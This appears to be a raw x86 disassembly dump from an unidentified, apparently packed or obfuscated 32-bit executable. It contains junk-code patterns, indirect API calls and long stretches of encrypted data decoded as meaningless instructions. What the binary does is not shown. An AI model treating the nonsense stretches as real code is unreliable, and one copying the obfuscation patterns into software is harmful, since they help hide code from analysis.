  412d32:	adc    DWORD PTR [eax],0xffffffc0
  412d35:	das    
  412d36:	jne    0x412ccf
  412d38:	addr16 je 0x412db2
  412d3b:	in     eax,0x33
  412d3d:	test   BYTE PTR [esi+0x3b204b74],bh
  412d43:	js     0x412d0f
  412d45:	push   ds
  412d46:	loopne 0x412d09
  412d48:	loopne 0x412d4c
  412d4a:	and    edi,edi
  412d4c:	mov    edi,0xcb79b576
  412d51:	mov    edx,0x9c2b8ae8
  412d56:	mov    DWORD PTR [ebp-0x10],ebx
  412d59:	mov    DWORD PTR ds:0x428465,0xc27
  412d63:	mov    ebx,DWORD PTR [ebp+0xc]
  412d66:	xor    eax,edi
  412d68:	xor    DWORD PTR ds:0x42842d,0x622f
  412d72:	xor    ecx,edx
  412d74:	mov    DWORD PTR ds:0x428465,0x97b
  412d7e:	mov    DWORD PTR [ebp-0x18],0xa5069aae
  412d85:	mov    DWORD PTR ds:0x42857d,0x75c6
  412d8f:	mov    DWORD PTR [ebp-0x1c],0xa50693ae
  412d96:	mov    DWORD PTR [ebp-0xc],ebx
  412d99:	mov    DWORD PTR ds:0x428559,0x6dfc
  412da3:	cmp    eax,DWORD PTR [ebp-0x10]
  412da6:	jne    0x412db4
  412dac:	cmp    ecx,ebx
  412dae:	je     0x414af6
  412db4:	mov    eax,DWORD PTR [ebp-0x20]
  412db7:	sub    eax,0x3b59
  412dbc:	mov    eax,DWORD PTR [ebp-0x20]
  412dbf:	xor    ecx,ecx
  412dc1:	shld   ecx,eax,0x2
  412dc5:	xor    DWORD PTR ds:0x428411,0x4284e9
  412dcf:	shl    eax,0x2
  412dd2:	add    DWORD PTR ds:0x428449,0x4284e1
  412ddc:	xor    ecx,edx
  412dde:	cmp    DWORD PTR ds:0x4284e1,0x0
  412de5:	not    edx
  412de7:	not    edx
  412de9:	jmp    0x412e3e
  412dee:	mov    DWORD PTR ds:0x42855d,edx
  412df4:	not    edx
  412df6:	cmp    DWORD PTR ds:0x4284e1,0x0
  412dfd:	je     0x412e29
  412e03:	push   0x8204
  412e08:	push   DWORD PTR [ebp-0x28]
  412e0b:	call   DWORD PTR ds:0x42e010
  412e11:	mov    edx,DWORD PTR ds:0x428429
  412e17:	xor    DWORD PTR ds:0x428559,edx
  412e1d:	mov    edx,DWORD PTR ds:0x428579
  412e23:	sub    DWORD PTR ds:0x428575,edx
  412e29:	inc    edx
  412e2a:	adc    edx,DWORD PTR ds:0x428575
  412e30:	xor    edx,edx
  412e32:	xor    edx,DWORD PTR ds:0x428471
  412e38:	adc    DWORD PTR ds:0x428569,edx
  412e3e:	mov    edx,DWORD PTR [ebp+0x8]
  412e41:	xor    eax,edi
  412e43:	mov    edi,DWORD PTR [ebp+0xc]
  412e46:	mov    DWORD PTR ds:0x428361,0x757
  412e50:	cmp    eax,edx
  412e52:	mov    DWORD PTR ds:0x428331,0x1fab
  412e5c:	jne    0x412e74
  412e62:	cmp    ecx,edi
  412e64:	mov    DWORD PTR ds:0x428375,0x4385
  412e6e:	je     0x414af6
  412e74:	add    eax,DWORD PTR ds:0x428431
  412e7a:	mov    eax,DWORD PTR [ebp-0x1c]
  412e7d:	neg    DWORD PTR ds:0x428339
  412e83:	mov    ecx,DWORD PTR [ebp-0x1c]
  412e86:	push   0xfffffffe
  412e88:	and    DWORD PTR ds:0x428371,edx
  412e8e:	pop    ebx
  412e8f:	or     DWORD PTR ds:0x42857d,edx
  412e95:	jmp    0x4131ce
  412e9a:	imul   ebx,DWORD PTR [edi+0x1cbccb74],0xf12aa079
  412ea4:	and    BYTE PTR [esi-0x5b0570d2],bl
  412eaa:	mov    WORD PTR [eax-0x42],?
  412ead:	mov    esi,0xbebec4ed
  412eb2:	push   edi
  412eb3:	das    
  412eb4:	mov    ebx,0x24be3b93
  412eb9:	or     ecx,edi
  412ebb:	cmp    al,0xd
  412ebd:	cli    
  412ebe:	jl     0x412e99
  412ec0:	int3   
  412ec1:	sub    al,0x66
  412ec3:	or     eax,edi
  412ec5:	into   
  412ec6:	pop    es
  412ec7:	add    ch,BYTE PTR [ebp+0x6accd1ab]
  412ecd:	lds    edx,FWORD PTR [edi]
  412ecf:	add    bh,BYTE PTR [edx-0x32]
  412ed2:	test   ecx,esi
  412ed4:	(bad)  
  412ed5:	rcr    DWORD PTR [edx],cl
  412ed7:	mov    edi,0x9070fcc0
  412edc:	int3   
  412edd:	or     ecx,DWORD PTR [ebp-0x73]
  412ee0:	pop    edx
  412ee1:	pop    esp
  412ee2:	push   esp
  412ee3:	clc    
  412ee4:	and    BYTE PTR [edx+0x3],dh
  412ee7:	jae    0x412f53
  412ee9:	shl    BYTE PTR [edi+0x19],1
  412eec:	mov    edi,0x11ca9ff0
  412ef1:	mov    dh,0xbf
  412ef3:	hlt    
  412ef4:	xchg   BYTE PTR [esi+ebx*2+0x50901ba3],bh
  412efb:	adc    cl,cl
  412efd:	xor    eax,0x7c07499
  412f02:	mov    eax,ds:0x1c3de019
  412f07:	inc    ebp
  412f08:	or     eax,esi
  412f0a:	pop    ecx
  412f0b:	add    DWORD PTR [esi],0x44
  412f0e:	pop    ss
  412f0f:	or     DWORD PTR [eax+0x4c],eax
  412f12:	add    al,0x22
  412f14:	int    0xe4
  412f16:	push   ecx
  412f17:	icebp  
  412f18:	jle    0x412f8d
  412f1a:	sub    eax,0xade267c
  412f1f:	retf   
  412f20:	adc    BYTE PTR [ebx-0x63],dh
  412f23:	rcr    BYTE PTR [edi+edx*4-0x2a26fde9],cl
  412f2a:	movq   QWORD PTR [ecx-0x61521326],mm5
  412f31:	jl     0x412f86
  412f33:	sbb    edx,DWORD PTR [ebp-0x10174590]
  412f39:	retf   
  412f3a:	xchg   esp,eax
  412f3b:	inc    edi
  412f3c:	xchg   esp,eax
  412f3d:	jecxz  0x412ed2
  412f3f:	rep lods eax,DWORD PTR ds:[esi]
  412f41:	and    eax,0xc0bfbf9a
  412f46:	or     esi,esi
  412f48:	push   0xe
  412f4a:	pop    esp
  412f4b:	jnp    0x412f56
  412f4d:	fs ss add eax,0x59fb5299
  412f54:	mov    ch,0xc1
  412f56:	xlat   BYTE PTR ds:[ebx]
  412f57:	adc    BYTE PTR [esi+eax*8-0x3c],al
  412f5b:	icebp  
  412f5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f5d:	pop    ecx
  412f5e:	inc    ebx
  412f5f:	cmp    al,0x1e
  412f61:	mov    bh,0xda
  412f63:	outs   dx,BYTE PTR ds:[esi]
  412f64:	sub    BYTE PTR [ecx+0x2d387237],cl
  412f6a:	in     al,0x67
  412f6c:	add    al,0xc5
  412f6e:	cmp    DWORD PTR [ebp+0x2f],edi
  412f71:	sbb    dh,ch
  412f73:	retf   0x6879
  412f76:	jl     0x412f74
  412f78:	test   dh,bl
  412f7a:	or     BYTE PTR [edi-0x4d],cl
  412f7d:	mov    edx,0x51b4c5f7
  412f82:	cli    
  412f83:	sub    dh,bh
  412f85:	mov    ?,WORD PTR [ebp-0x6411deb]
  412f8b:	mov    cs,WORD PTR [ecx]
  412f8d:	pop    ds
  412f8e:	loopne 0x412f30
  412f90:	xchg   esp,eax
  412f91:	shl    BYTE PTR [ecx-0x32],0x1a
  412f95:	mov    bl,0xab
  412f97:	mov    eax,0xb64d65cd
  412f9c:	pusha  
  412f9d:	bound  edi,QWORD PTR [esi-0x27db3540]
  412fa3:	mov    eax,ds:0x7a279409
  412fa8:	ins    BYTE PTR es:[edi],dx
  412fa9:	jmp    0x41300f
  412fab:	ret    0x6df1
  412fae:	cmp    eax,0xc120d552
  412fb3:	mov    esp,0x1be04695
  412fb8:	mov    ebx,0xb81fa92c
  412fbd:	mov    ah,0x35
  412fbf:	jecxz  0x412ff0
  412fc1:	sbb    al,0x8e
  412fc3:	repz popa 
  412fc5:	fiadd  DWORD PTR [eax+edi*2]
  412fc8:	jle    0x413045
  412fca:	and    edx,esp
  412fcc:	mov    bh,0x56
  412fce:	dec    ecx
  412fcf:	jl     0x412f7b
  412fd1:	(bad)  
  412fd2:	aad    0xc1
  412fd4:	push   ebp
  412fd5:	mov    ebx,0x39895a7e
  412fda:	push   esi
  412fdb:	daa    
  412fdc:	mov    ds:0x864b6631,al
  412fe1:	icebp  
  412fe2:	fstp   QWORD PTR [esi*1-0x1ff24a68]
  412fe9:	mov    al,ds:0x7d822bc2
  412fee:	lods   al,BYTE PTR ds:[esi]
  412fef:	inc    ecx
  412ff0:	sbb    BYTE PTR es:[ebx+0x3],ch
  412ff4:	sub    ebp,0xd02f9ec7
  412ffa:	push   edi
  412ffb:	imul   ecx,DWORD PTR [ecx-0x631d99ef],0xde003d74
  413005:	popa   
  413006:	js     0x412fb5
  413008:	cmp    DWORD PTR [edi-0x3a9c0689],ecx
  41300e:	add    al,0xfa
  413010:	outs   dx,BYTE PTR ds:[esi]
  413011:	icebp  
  413012:	fmul   QWORD PTR [edi-0x1bb5c6c4]
  413018:	iret   
  413019:	dec    esp
  41301a:	test   al,0xa1
  41301c:	or     al,0x68
  41301e:	stos   BYTE PTR es:[edi],al
  41301f:	mov    ebx,0xee3f031
  413024:	cli    
  413025:	les    edx,FWORD PTR [eax-0x5909d818]
  41302b:	jp     0x413059
  41302d:	fsubr  QWORD PTR [esi]
  41302f:	dec    esp
  413030:	sub    BYTE PTR [ebp+ebx*4-0x1a],cl
  413034:	sub    DWORD PTR [ecx-0xd01cd3d],0xd326e4ef
  41303e:	and    eax,0x7f73ca52
  413043:	lods   eax,DWORD PTR ds:[esi]
  413044:	sub    DWORD PTR [ecx-0x5105d062],ecx
  41304a:	mov    ds:0x96660cd6,al
  41304f:	scas   al,BYTE PTR es:[edi]
  413050:	out    dx,eax
  413051:	add    BYTE PTR [edi],0xac
  413054:	jge    0x413048
  413056:	mov    bl,0x6b
  413058:	lods   al,BYTE PTR ds:[esi]
  413059:	sbb    BYTE PTR [eax-0x7b],dl
  41305c:	out    0xd9,al
  41305e:	inc    edi
  41305f:	push   ds
  413060:	in     eax,dx
  413061:	js     0x4130da
  413063:	mov    ch,0x5e
  413065:	adc    eax,DWORD PTR [ebp+0x43]
  413068:	imul   eax,ecx,0x44
  41306b:	push   ds
  41306c:	push   es
  41306d:	pop    edi
  41306e:	sbb    ch,bh
  413070:	in     al,dx
  413071:	leave  
  413072:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413073:	sti    
  413074:	fsub   QWORD PTR [esi]
  413076:	pop    edi
  413077:	jp     0x4130cd
  413079:	bound  edx,QWORD PTR [edx-0x14]
  41307c:	ins    BYTE PTR es:[edi],dx
  41307d:	jo     0x4130f1
  41307f:	jecxz  0x41309e
  413081:	repz dec ecx
  413083:	lea    eax,[esi]
  413085:	loope  0x413055
  413087:	add    bl,BYTE PTR [edx+0x4139c004]
  41308d:	or     ah,BYTE PTR [esi+0x237c9039]
  413093:	mov    bl,0xb3
  413095:	enter  0xe649,0xb9
  413099:	push   esi
  41309a:	and    al,0x3
  41309c:	ss in  al,dx
  41309e:	enter  0xb943,0xd8
  4130a2:	cmp    DWORD PTR [eax+0x66945c25],esp
  4130a8:	stc    
  4130a9:	sub    ah,BYTE PTR [ecx+ecx*8]
  4130ac:	xor    ecx,0x56
  4130af:	inc    edi
  4130b0:	xchg   edi,eax
  4130b1:	nop
  4130b2:	into   
  4130b3:	pushf  
  4130b4:	mov    ds:0x774f95fe,al
  4130b9:	imul   edx,DWORD PTR [esi+0x5d0a3aab],0x1
  4130c0:	div    BYTE PTR [edi-0x23]
  4130c3:	scas   al,BYTE PTR es:[edi]
  4130c4:	sti    
  4130c5:	cwde   
  4130c6:	pop    ebp
  4130c7:	sbb    DWORD PTR [edi],eax
  4130c9:	sbb    esi,edx
  4130cb:	leave  
  4130cc:	mov    dl,0x83
  4130ce:	mov    al,ds:0x591f3654
  4130d3:	push   ebx
  4130d4:	iret   
  4130d5:	aaa    
  4130d6:	jmp    0x41306f
  4130d8:	pop    ebx
  4130d9:	in     eax,0xdf
  4130db:	out    0x72,eax
  4130dd:	cmp    dl,BYTE PTR [edx]
  4130df:	inc    ebp
  4130e0:	out    dx,al
  4130e1:	cmp    BYTE PTR [ebx],dl
  4130e3:	ret    
  4130e4:	mov    bl,0x8c
  4130e6:	cmp    dh,ah
  4130e8:	xchg   ecx,eax
  4130e9:	inc    edx
  4130ea:	dec    esi
  4130eb:	(bad)  
  4130ec:	fsub   st(4),st
  4130ee:	xlat   BYTE PTR ds:[ebx]
  4130ef:	stos   BYTE PTR es:[edi],al
  4130f0:	xchg   esp,eax
  4130f1:	sub    al,bl
  4130f3:	int    0x92
  4130f5:	cmp    BYTE PTR [edx+0x222071e],ah
  4130fb:	mov    esp,0xb2027d5c
  413100:	and    al,bl
  413102:	push   ds
  413103:	iret   
  413104:	sbb    ebp,DWORD PTR [edi+0x257af9fc]
  41310a:	push   0x77
  41310c:	pop    ds
  41310d:	cmp    cl,dl
  41310f:	rol    eax,0x8
  413112:	push   edi
  413113:	out    dx,eax
  413114:	fstp   DWORD PTR [edx]
  413116:	mov    ebp,0x178dfbc3
  41311b:	repz inc edi
  41311d:	mov    esi,0x5c328a64
  413122:	nop
  413123:	neg    BYTE PTR [eax+edx*4]
  413126:	jg     0x41315c
  413128:	dec    edx
  413129:	lods   al,BYTE PTR ds:[esi]
  41312a:	popf   
  41312b:	inc    edx
  41312c:	pop    ss
  41312d:	loopne 0x4131a8
  41312f:	pop    ebp
  413130:	xchg   esi,eax
  413131:	pop    es
  413132:	push   0x31328f7a
  413137:	sbb    al,0x3
  413139:	add    eax,DWORD PTR [ebp-0x5e]
  41313c:	sbb    ch,BYTE PTR [ebp-0x7a]
  41313f:	dec    esp
  413140:	mov    eax,ds:0x6590c628
  413145:	add    al,0xc2
  413147:	xchg   sp,ax
  413149:	mov    ch,0xae
  41314b:	jbe    0x4130ff
  41314d:	fwait
  41314e:	lods   al,BYTE PTR ds:[esi]
  41314f:	xchg   BYTE PTR [ebx+esi*1-0x28],al
  413153:	and    ebp,DWORD PTR [ebx+esi*2-0x6204b57b]
  41315a:	sbb    eax,0x730f0fb9
  41315f:	dec    edi
  413160:	sbb    BYTE PTR [ecx-0x62],0xc1
  413164:	sbb    cl,0x77
  413167:	pop    edi
  413168:	mov    ch,0x3e
  41316a:	sbb    esi,DWORD PTR [ebx+0x1a]
  41316d:	and    ah,dl
  41316f:	rol    BYTE PTR [esi+0x2e],cl
  413172:	push   ds
  413173:	popa   
  413174:	idiv   al
  413176:	jns    0x41312f
  413178:	fs xchg eax,ecx
  41317b:	in     al,dx
  41317c:	js     0x4131f1
  41317e:	scas   eax,DWORD PTR es:[edi]
  41317f:	mov    dl,0xf
  413181:	sub    ebx,edi
  413183:	shr    dl,1
  413185:	ins    BYTE PTR es:[edi],dx
  413186:	sub    eax,0x6a081e03
  41318b:	aas    
  41318c:	cmp    ecx,ebp
  41318e:	rol    DWORD PTR ds:0x4e45c447,cl
  413194:	call   0x12a13e8e
  413199:	mov    edx,0xc7db0dbc
  41319e:	jno    0x4131ea
  4131a0:	test   BYTE PTR [ecx+0x39399a7d],bl
  4131a6:	xchg   edi,eax
  4131a7:	push   esp
  4131a8:	idiv   BYTE PTR [ebp-0x38699f2a]
  4131ae:	loop   0x413185
  4131b0:	call   DWORD PTR [esi+0x813cd5b]
  4131b6:	iret   
  4131b7:	loop   0x4131b3
  4131b9:	fisttp QWORD PTR [ebp-0x65]
  4131bc:	fs xchg ebx,eax
  4131be:	retf   
  4131bf:	(bad)  
  4131c1:	test   ecx,edx
  4131c3:	inc    edi
  4131c4:	pusha  
  4131c5:	mov    DWORD PTR [esi-0x48],0xd0db7ac8
  4131cc:	in     al,0x7d
  4131ce:	xor    ecx,ebx
  4131d0:	xor    edi,edi
  4131d2:	add    edi,DWORD PTR ds:0x428435
  4131d8:	sub    DWORD PTR ds:0x428415,edi
  4131de:	shl    ecx,0x1e
  4131e1:	xor    DWORD PTR ds:0x428365,0x3d84
  4131eb:	mov    edi,0xa5069baf
  4131f0:	xor    eax,edi
  4131f2:	shr    eax,0x2
  4131f5:	jmp    0x41352e
  4131fa:	jmp    0x8a913c60
  4131ff:	mov    eax,0x40087bbc
  413204:	push   0xffffffd1
  413206:	repnz sar BYTE PTR [edx-0x4181435c],0xbe
  41320e:	in     eax,dx
  41320f:	les    edi,FWORD PTR [esi-0x450fb742]
  413215:	xchg   ecx,eax
  413216:	cwde   
  413217:	fiadd  WORD PTR [ecx]
  413219:	fmul   DWORD PTR [ebp-0x75ff9f23]
  41321f:	xchg   ebx,eax
  413220:	jmp    0x4131e4
  413222:	mov    esp,0x334b5bda
  413227:	out    dx,eax
  413228:	pop    eax
  413229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41322a:	sti    
  41322b:	adc    al,0xa1
  41322d:	ficomp WORD PTR [esi]
  41322f:	fdiv   QWORD PTR [edx-0x35]
  413232:	xchg   DWORD PTR ds:0x13dafeea,ebx
  413238:	cmp    eax,0xb2ba1c51
  41323d:	mov    ebx,0x43187c77
  413242:	in     eax,0x66
  413244:	repnz and BYTE PTR [edi-0x68],dl
  413248:	xchg   esi,eax
  413249:	and    eax,0x5615430
  41324e:	mov    ecx,0xcafdf1d9
  413253:	xlat   BYTE PTR ds:[ebx]
  413254:	mov    bh,0x96
  413256:	fnsave [eax+0x27]
  413259:	js     0x4131dd
  41325b:	cmp    ah,BYTE PTR [edi*4+0x7ce67376]
  413262:	push   edx
  413263:	pop    ebp
  413264:	inc    ecx
  413265:	and    dh,BYTE PTR [edi+0x143f0042]
  41326b:	adc    al,0x96
  41326d:	sbb    edx,esi
  41326f:	repz inc ebp
  413271:	(bad)  
  413272:	xor    al,0x7f
  413274:	outs   dx,DWORD PTR ds:[esi]
  413275:	push   esi
  413276:	cmp    DWORD PTR [edx+0x13],ebx
  413279:	xor    eax,0xdb656a2f
  41327e:	sbb    DWORD PTR [esi-0x2c],eax
  413281:	cmp    BYTE PTR [eax-0x8170c0f],al
  413287:	lea    esi,[eax+0x6adc42ab]
  41328d:	rol    BYTE PTR [ebx-0x5e5eb23],cl
  413293:	xor    eax,0x65239673
  413298:	sub    eax,0x7d81ac07
  41329d:	mov    BYTE PTR [esp+eiz*2+0x2f],dh
  4132a1:	mov    ecx,0x105a79ec
  4132a6:	std    
  4132a7:	jmp    0x4132b3
  4132a9:	js     0x4132f3
  4132ab:	lea    edi,[ecx-0xa]
  4132ae:	inc    esp
  4132af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132b0:	aam    0xcf
  4132b2:	and    al,0xcd
  4132b4:	test   BYTE PTR [ebx],bh
  4132b6:	leave  
  4132b7:	in     al,dx
  4132b8:	xchg   ecx,eax
  4132b9:	jle    0x413302
  4132bb:	scas   eax,DWORD PTR es:[edi]
  4132bc:	xchg   ecx,eax
  4132bd:	mov    al,ds:0x2684c9a1
  4132c2:	rcr    BYTE PTR [esi+eax*8],0x66
  4132c6:	out    0x22,al
  4132c8:	xor    DWORD PTR [eax],esi
  4132ca:	imul   DWORD PTR [edi+eiz*4+0x73711cc3]
  4132d1:	pop    ebp
  4132d2:	xchg   esp,eax
  4132d3:	(bad)  
  4132d4:	xor    ecx,DWORD PTR [eax]
  4132d6:	xchg   ecx,eax
  4132d7:	rol    DWORD PTR [edx-0x65b70fa],cl
  4132dd:	pop    ss
  4132de:	add    DWORD PTR [ebx+esi*1],esp
  4132e1:	pop    ss
  4132e2:	daa    
  4132e3:	adc    cl,bh
  4132e5:	and    eax,0x48f15259
  4132ea:	out    0xa0,eax
  4132ec:	xbegin 0x96248854
  4132f2:	mov    cl,0x99
  4132f4:	clc    
  4132f5:	sbb    BYTE PTR [edi],bh
  4132f7:	sub    dl,cl
  4132f9:	fistp  QWORD PTR [ebx+0x76ed11cf]
  4132ff:	pusha  
  413300:	aas    
  413301:	xchg   edx,eax
  413302:	out    0x37,al
  413304:	dec    ecx
  413305:	fisub  DWORD PTR [ebp-0xc]
  413308:	push   cs
  413309:	and    al,dl
  41330b:	sbb    edi,DWORD PTR [edx]
  41330d:	bound  ebp,QWORD PTR [edx]
  41330f:	js     0x413317
  413311:	push   ecx
  413312:	sub    BYTE PTR [ecx],dh
  413314:	fdiv   DWORD PTR [ebx]
  413316:	and    eax,0x7d99402b
  41331b:	jmp    0x936c504b
  413320:	dec    edx
  413321:	(bad)  
  413322:	ret    0x64f7
  413325:	es call 0xfa45:0xbdb8c9c5
  41332d:	cs fs mov es,ebp
  413331:	dec    ebp
  413332:	(bad)  
  413333:	cmp    ecx,DWORD PTR [edx+0x36f976b8]
  413339:	adc    al,al
  41333b:	inc    esi
  41333c:	retf   0xca68
  41333f:	popa   
  413340:	mov    al,0x5
  413342:	repz add dl,0x90
  413346:	das    
  413347:	mov    esi,edi
  413349:	mov    dl,0xfa
  41334b:	shl    DWORD PTR [edi+0x5d],0xd9
  41334f:	mov    esp,0x62c6c240
  413354:	sti    
  413355:	push   eax
  413356:	dec    edx
  413357:	div    ah
  413359:	enter  0xd2e4,0x1b
  41335d:	push   ecx
  41335e:	dec    ebp
  41335f:	xor    al,0xea
  413361:	dec    esp
  413362:	mov    ebx,0x7771c879
  413367:	repnz sbb al,0x3d
  41336a:	jg     0x413378
  41336c:	clc    
  41336d:	rcr    BYTE PTR ds:0x3ee7daaf,1
  413373:	dec    esp
  413374:	adc    al,0xaa
  413376:	or     al,0xc5
  413378:	mov    edx,0x57f13698
  41337d:	cmp    edx,ebp
  41337f:	and    al,0xbb
  413381:	jecxz  0x413319
  413383:	jmp    0x4fe:0xd6009680
  41338a:	inc    ebp
  41338b:	adc    ah,BYTE PTR [edi-0x4d3adcb2]
  413391:	ja     0x41333d
  413393:	or     al,0xd5
  413395:	adc    dl,BYTE PTR [eax-0x45]
  413398:	mov    ch,cl
  41339a:	adc    BYTE PTR [edi+0x3428100f],dl
  4133a0:	dec    ebx
  4133a1:	sar    DWORD PTR [esi+0x36],0x85
  4133a5:	adc    ebp,ecx
  4133a7:	jmp    0x413421
  4133a9:	ss jbe 0x4133a2
  4133ac:	or     BYTE PTR [esi+0x26797060],0x68
  4133b3:	neg    bh
  4133b5:	and    eax,0x1fc8911
  4133ba:	dec    ebp
  4133bb:	cmp    bh,bl
  4133bd:	pop    edi
  4133be:	bound  eax,QWORD PTR [esi+ebp*4]
  4133c1:	add    al,0x6d
  4133c3:	popf   
  4133c4:	jmp    DWORD PTR [ebp+0x68]
  4133c7:	adc    BYTE PTR [ebx-0x48108caa],bh
  4133cd:	into   
  4133ce:	ins    DWORD PTR es:[edi],dx
  4133cf:	iret   
  4133d0:	repz ror BYTE PTR [esi+0x6f],cl
  4133d4:	es enter 0xb52e,0x53
  4133d9:	cmp    BYTE PTR [edx+0x15],dl
  4133dc:	add    DWORD PTR [ebx+0x35],eax
  4133df:	or     BYTE PTR [ecx-0x3d7e8c39],0x14
  4133e6:	das    
  4133e7:	sbb    bl,BYTE PTR [ecx-0x2d]
  4133ea:	cmp    DWORD PTR ss:[ecx-0x68],0xe909a6b5
  4133f2:	fwait
  4133f3:	sub    al,0xb7
  4133f5:	dec    esi
  4133f6:	add    ebp,DWORD PTR [edx+0x6e]
  4133f9:	inc    esi
  4133fa:	inc    ecx
  4133fb:	shl    ebx,0x82
  4133fe:	frstpm(287 only) 
  413400:	xchg   ebp,eax
  413401:	and    BYTE PTR [edi-0x27aedd88],ah
  413407:	rcr    BYTE PTR [eax],0xde
  41340a:	popa   
  41340b:	and    ecx,ecx
  41340d:	cs jno 0x413439
  413410:	pop    es
  413411:	add    esp,edi
  413413:	popf   
  413414:	inc    ebp
  413415:	lahf   
  413416:	inc    eax
  413417:	aam    0x1
  413419:	scas   al,BYTE PTR es:[edi]
  41341a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41341b:	inc    esi
  41341c:	(bad)  
  41341d:	pop    ds
  41341e:	adc    BYTE PTR [ecx-0x7d],cl
  413421:	sahf   
  413422:	imul   ebx,DWORD PTR [ecx],0xe727d430
  413428:	repz mov eax,0x67750924
  41342e:	mov    esp,0x8ced4a59
  413433:	jmp    0x9414b822
  413438:	fist   WORD PTR [edi+0x3e]
  41343b:	mov    ecx,0x66b46f4b
  413440:	aas    
  413441:	push   es
  413442:	ret    
  413443:	jmp    0x277e8166
  413448:	mov    ch,dh
  41344a:	outs   dx,DWORD PTR ds:[esi]
  41344b:	rol    DWORD PTR [edi+0x6698803d],0xf9
  413452:	sbb    BYTE PTR [ebx+0x30],0xeb
  413456:	adc    ch,cl
  413458:	push   es
  413459:	leave  
  41345a:	(bad)  
  41345b:	mov    eax,0x16e9a389
  413460:	sbb    DWORD PTR [esi-0x60],ebp
  413463:	mov    DWORD PTR [eax],0xc2a2f25
  413469:	jbe    0x413427
  41346b:	pop    eax
  41346c:	nop
  41346d:	pop    ebp
  41346e:	xor    cl,BYTE PTR [ecx+0x69]
  413471:	cmp    eax,0xdec8feaa
  413476:	xchg   esp,eax
  413477:	sbb    BYTE PTR [eax+0x55],cl
  41347a:	les    eax,FWORD PTR [ebp-0x293180d6]
  413480:	jbe    0x41341c
  413482:	sub    DWORD PTR [esi],ecx
  413484:	(bad)  
  413485:	fsubr  DWORD PTR [eax]
  413487:	sub    cl,BYTE PTR [ebx]
  413489:	clc    
  41348a:	stos   BYTE PTR es:[edi],al
  41348b:	dec    ebx
  41348c:	push   ebx
  41348d:	mov    bh,0x16
  41348f:	sbb    WORD PTR [ebp+eiz*2-0x49],cx
  413494:	int3   
  413495:	pusha  
  413496:	xor    eax,0x5dee5b6c
  41349b:	stos   BYTE PTR es:[edi],al
  41349c:	pop    ebx
  41349d:	mov    eax,ds:0x32e50dc9
  4134a2:	mov    ebx,0x8643ae82
  4134a7:	cmp    al,0xfe
  4134a9:	test   eax,0xc2d09701
  4134ae:	pop    ecx
  4134af:	jle    0x413475
  4134b1:	scas   al,BYTE PTR es:[edi]
  4134b2:	and    eax,0x6ea07886
  4134b7:	daa    
  4134b8:	jmp    0x4134bc
  4134ba:	xor    bl,bl
  4134bc:	fcmovb st,st(7)
  4134be:	jb     0x4134fb
  4134c0:	sbb    al,0xe2
  4134c2:	jb     0x413488
  4134c4:	scas   eax,DWORD PTR es:[edi]
  4134c5:	test   dh,ch
  4134c7:	mov    DWORD PTR [ebp-0x457d06cd],ebp
  4134cd:	xor    esp,ecx
  4134cf:	xchg   ecx,eax
  4134d0:	mov    DWORD PTR [ecx-0x2ecf23c],ebp
  4134d6:	ret    0x2585
  4134d9:	call   0x2685:0xb4460ef2
  4134e0:	mov    dh,0x37
  4134e2:	add    eax,0x5510e7be
  4134e7:	jge    0x413492
  4134e9:	jecxz  0x41356a
  4134eb:	les    esp,FWORD PTR [esi-0x2054b30d]
  4134f1:	xor    BYTE PTR fs:[esi+0x31],0x8c
  4134f6:	add    al,0x6e
  4134f8:	mov    cl,0x96
  4134fa:	xor    BYTE PTR [ebx-0x68],0xaa
  4134fe:	mov    BYTE PTR [edx],bl
  413500:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  413502:	jo     0x41351b
  413504:	lock fwait
  413506:	in     eax,dx
  413507:	sbb    ebx,DWORD PTR [ecx+0x6e]
  41350a:	ret    0x940f
  41350d:	mov    eax,0xe5ddab3a
  413512:	std    
  413513:	mov    bh,0x9e
  413515:	out    dx,eax
  413516:	xor    BYTE PTR [ebp+0x5bf397dd],bl
  41351c:	xchg   edi,eax
  41351d:	adc    DWORD PTR [ecx],ecx
  41351f:	cwde   
  413520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413521:	push   esp
  413522:	dec    esi
  413523:	jge    0x4134cc
  413525:	in     al,dx
  413526:	sbb    BYTE PTR [eax+0x5a35f05a],al
  41352c:	push   edx
  41352d:	and    BYTE PTR [ebx],cl
  41352f:	rol    DWORD PTR [ebx+0x4283313d],0x0
  413536:	add    bh,al
  413538:	add    eax,0x428441
  41353d:	or     DWORD PTR [ebx+0x0],ebx
  413540:	add    BYTE PTR [edi],cl
  413542:	mov    bh,0xd
  413544:	pop    ecx
  413545:	add    DWORD PTR [edx+0x0],0xffffffe9
  413549:	fld    DWORD PTR [eax]
  41354b:	add    BYTE PTR [eax],al
  41354d:	mov    DWORD PTR ds:0x42836d,0x463b
  413557:	cmp    DWORD PTR ds:0x428331,0x0
  41355e:	ja     0x413594
  413564:	push   0x1092
  413569:	push   0x34c2
  41356e:	push   DWORD PTR [ebp-0x10]
  413571:	push   0x63e1
  413576:	push   0x428295
  41357b:	push   DWORD PTR [ebp-0x24]
  41357e:	call   DWORD PTR ds:0x42e0d8
  413584:	adc    DWORD PTR ds:0x4284f9,0x3ae5
  41358e:	or     ecx,DWORD PTR ds:0x428549
  413594:	mov    ecx,DWORD PTR ds:0x4284d9
  41359a:	xor    DWORD PTR ds:0x428565,ecx
  4135a0:	add    DWORD PTR ds:0x4284c5,0x73c1
  4135aa:	xor    DWORD PTR ds:0x4284d1,0x45f8
  4135b4:	cmp    DWORD PTR ds:0x4284fd,0x0
  4135bb:	mov    ecx,0x9c7
  4135c0:	mov    DWORD PTR ds:0x42834d,0x5708
  4135ca:	mov    DWORD PTR ds:0x4284d1,0x67de
  4135d4:	jmp    0x413626
  4135d9:	mov    ecx,DWORD PTR ds:0x42834d
  4135df:	cmp    DWORD PTR ds:0x4284fd,0x0
  4135e6:	jl     0x413613
  4135ec:	push   DWORD PTR [ebp-0x14]
  4135ef:	push   DWORD PTR [ebp-0x10]
  4135f2:	push   DWORD PTR [ebp-0x28]
  4135f5:	call   DWORD PTR ds:0x42e0dc
  4135fb:	adc    DWORD PTR ds:0x42842d,edx
  413601:	mov    ecx,DWORD PTR ds:0x428341
  413607:	and    DWORD PTR ds:0x42854d,ecx
  41360d:	and    DWORD PTR ds:0x428355,edx
